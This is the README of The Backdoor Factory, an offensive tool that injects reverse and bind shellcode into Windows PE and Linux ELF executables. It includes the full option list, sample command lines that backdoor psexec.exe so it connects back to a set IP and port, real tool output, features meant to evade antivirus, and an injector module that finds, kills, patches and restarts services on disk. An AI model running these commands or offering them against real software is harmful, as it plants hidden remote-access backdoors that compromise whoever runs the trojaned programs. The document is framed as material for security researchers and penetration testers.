##The Backdoor Factory
For security professionals and researchers only.

Many thanks to Ryan O'neill --ryan 'at' codeslum <d ot> org--
Without him, I would still be trying to do stupid things 
with the elf format.
Also thanks to Silvio Cesare with his 1998 paper 
(http://vxheaven.org/lib/vsc01.html) which these ELF patching
techniques are based on.

I learned a ton about the ELF format.  The first frustrating thing I noticed were the lack of code caves in debian builds.  However, you don't really need them. See the link above, circa 1998.  The look and feel to the user will be no different for ELF binaries, just point the tool at them as you have for PE bins.

From DerbyCon: 
    
    Video: http://www.youtube.com/watch?v=jXLb2RNX5xs

    Injection Module Demo: http://www.youtube.com/watch?v=04aJAex2o3U

    Slides: http://www.slideshare.net/midnite_runr/patching-windows-executables-with-the-backdoor-factory

Injects shellcode into win32/64 PE and linux32/64 ELF Files, to continue normal file execution (if the shellcode supports it), by patching the exe/dll directly.

Some executables have built in protections, as such this will not work on all binaries.  It is advisable that you test target binaries before deploying them to clients or using them in exercises.

Recently tested on all 32/64bit Sysinternal tools and Chrome browser.
---

Usage: ./backdoor.py -h

Usage: backdoor.py [options]

Options:
  -h, --help            show this help message and exit
  
  -f FILE, --file=FILE  File to backdoor
  
  -s SHELL, --shell=SHELL
                        Payloads that are available for use.
  
  -H HOST, --hostip=HOST
                        IP of the C2 for reverse connections
  
  -P PORT, --port=PORT  The port to either connect back to for reverse shells
                        or to listen on for bind shells
  
  -J, --cave_jumping    Select this options if you want to use code cave
                        jumping to further hide your shellcode in the binary.
  
  -a, --add_new_section
                        Mandating that a new section be added to the exe
                        (better success) but less av avoidance
  
  -U SUPPLIED_SHELLCODE, --user_shellcode=SUPPLIED_SHELLCODE
                        User supplied shellcode, make sure that it matches the
                        architecture that you are targeting.
  
  -c, --cave            The cave flag will find code caves that can be used
                        for stashing shellcode. This will print to all the
                        code caves of a specific size.The -l flag can be use
                        with this setting.
  
  -l SHELL_LEN, --shell_length=SHELL_LEN
                        For use with -c to help find code caves of different
                        sizes
  
  -o OUTPUT, --output-file=OUTPUT
                        The backdoor output file
  
  -n NSECTION, --section=NSECTION
                        New section name must be less than seven characters
  
  -d DIR, --directory=DIR
                        This is the location of the files that you want to
                        backdoor. You can make a directory of file backdooring
                        faster by forcing the attaching of a codecave to the
                        exe by using the -a setting.
  
  -w, --change_access   This flag changes the section that houses the codecave
                        to RWE. Sometimes this is necessary. Enabled by
                        default. If disabled, the backdoor may fail.
  
  -i, --injector        This command turns the backdoor factory in a hunt and
                        shellcode inject type of mechinism. Edit the target
                        settings in the injector module.
  
  -u SUFFIX, --suffix=SUFFIX
                        For use with injector, places a suffix on the original
                        file for easy recovery
  
  -D, --delete_original
                        For use with injector module.  This command deletes
                        the original file.  Not for use in production systems.
                        *Author not responsible for stupid uses.*
  
  -O DISK_OFFSET, --disk_offset=DISK_OFFSET
                        Starting point on disk offset, in bytes. Some authors
                        want to obfuscate their on disk offset to avoid
                        reverse engineering, if you find one of those files
                        use this flag, after you find the offset.
  
  -S, --support_check   To determine if the file is supported by BDF prior to
                        backdooring the file. For use by itself or with
                        verbose. This check happens automatically if the
                        backdooring is attempted.
  
  -q, --no_banner       Kills the banner.
  
  -v, --verbose         For debug information output.


---

Features:

-After making a copy of the target file, the file copy will be patched directly.

-Finding all codecaves in an EXE/DLL.

-Injecting modified reverse/bind shells that allow continued execution after connection to the attacker.

-Modifying the PE/COFF header to add an additional section for all win32 executables/dlls, including those with an import table.

-Using the existing shellcode options, the ability to select PORT and HOST as connection options

-The ability to backdoor a directory of executables/dlls

---------------------------------------------

Sample Usage:
---

###Backdoor a exe/dll using an existing code cave:

./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp 

[*] In the backdoor module

[*] Checking if binary is supported

[*] Gathering file info

[*] Reading win32 entry instructions

[*] Looking for and setting selected shellcode

[*] Creating win32 resume execution stub

[*] Looking for caves that will fit the minimum shellcode length of 402

[*] All caves lengths:  (402,)

-############################################################

The following caves can be used to inject code and possibly

continue execution.

**Don't like what you see? Use jump, single, or append.**

-############################################################

[*] Cave 1 length as int: 402

[*] Available caves:

1. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d2d5 End: 0x2d4d0; Cave Size: 507

2. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d4e9 End: 0x2d6d5; Cave Size: 492

3. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d6e3 End: 0x2d8d8; Cave Size: 501

4. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2d8f1 End: 0x2dadd; Cave Size: 492

5. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dae7 End: 0x2dce0; Cave Size: 505

6. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2dcf3 End: 0x2dee5; Cave Size: 498

7. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2defb End: 0x2e0ea; Cave Size: 495

8. Section Name: .data; Section Begin: 0x2d200 End: 0x2f200; Cave begin: 0x2e161 End: 0x2e390; Cave Size: 559

9. Section Name: .rsrc; Section Begin: 0x2f200 End: 0x5bc00; Cave begin: 0x58a39 End: 0x58c68; Cave Size: 559

**************************************************

[!] Enter your selection: 5

Using selection: 5

[*] Changing Section Flags

[*] Patching initial entry instructions

[*] Creating win32 resume execution stub

[*] psexec.exe backdooring complete

File psexec.exe is in the 'backdoored' directory

---

###Backdoor an exe/dll by adding a code section:

./backdoor.py -f psexec.exe -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a 

Adding a new section to the exe/dll for shellcode injection

psexec.exe backdooring complete

File bd.psexec.exe is in current directory

---
###Backdoor a directory of exes:
./backdoor.py -d test/ -i 192.168.0.100 -p 8080 -s reverse_shell_tcp -a


...output too long for README...

---
###Hunt and backdoor: Injector | Windows Only
The injector module will look for target executables to backdoor on disk.  It will check to see if you have identified the target as a service, check to see if the process is running, kill the process and/or service, inject the executable with the shellcode, save the original file to either file.exe.old or another suffix of choice, and attempt to restart the process or service.  
Edit the python dictionary "list_of_targets" in the 'injector' module for targets of your choosing.

./backdoor.py -i -H 192.168.0.100 -P 8080 -s reverse_shell_tcp -a -u .moocowwow 
